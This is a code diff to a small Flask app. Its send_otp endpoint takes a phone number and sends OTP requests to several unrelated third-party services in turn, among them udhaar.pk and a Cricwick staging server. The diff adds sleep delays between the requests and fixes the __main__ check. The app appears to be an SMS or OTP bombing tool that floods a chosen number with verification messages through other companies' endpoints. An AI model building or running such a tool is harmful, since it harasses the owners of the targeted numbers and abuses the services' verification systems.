@@ -18,6 +18,9 @@ def send_otp():
         if not phone_number:
             return jsonify({"error": "Phone number is required"}), 400
 
+        # Delay before the first API request
+        time.sleep(4)
+
         # First API request
         url1 = "https://web.udhaar.pk/udhaar/dukaan/create/sendotp/"
         headers1 = {
@@ -44,6 +47,9 @@ def send_otp():
         if not response1.ok:
             return jsonify({"error": response1.text}), response1.status_code
 
+        # Delay between requests
+        time.sleep(1)
+
         # Second API request
         url2 = "https://staging.cricwick.net:13002/api/send_pin"
         params2 = {
@@ -58,6 +64,9 @@ def send_otp():
         response2 = requests.get(url2, params=params2)
         if response2.status_code != 200:
             return jsonify({"error": f"Failed to send OTP to Cricwick. Status code: {response2.status_code}"}), response2.status_code
+
+        # Delay between requests
+        time.sleep(3)
 
         # Format the phone number for the third API request
         if phone_number.startswith('0'):
@@ -119,5 +128,5 @@ def send_otp():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-if __name__ == '__name__':
+if __name__ == '__main__':
     app.run(debug=True)
